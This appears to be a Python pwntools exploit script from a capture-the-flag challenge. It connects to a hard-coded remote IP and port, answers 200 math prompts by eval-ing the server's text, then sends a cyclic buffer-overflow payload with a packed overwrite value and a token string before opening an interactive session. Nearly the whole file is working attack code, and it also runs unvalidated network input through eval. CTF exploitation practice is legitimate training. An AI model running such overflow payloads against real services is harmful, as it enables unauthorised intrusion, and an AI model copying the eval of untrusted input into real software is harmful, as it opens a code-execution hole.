#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

p = remote('39.97.210.182','40285')

# context.log_level = 'debug'

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

for i in range(200):
    ru('Math: ')
    print 'Time: %d'%i
    equal=ru('= ???input answer:')
    sl(str(eval(equal)))
# debug()
ru('good !')
payload = cyclic(100)
payload+= p32(0x12235612)
payload+= p32(0)
sl(payload)
sl('icq42cd641413940c5175cf39ec0d768')
# info_addr('tag',addr)
# log.warning('--------------')

p.interactive()

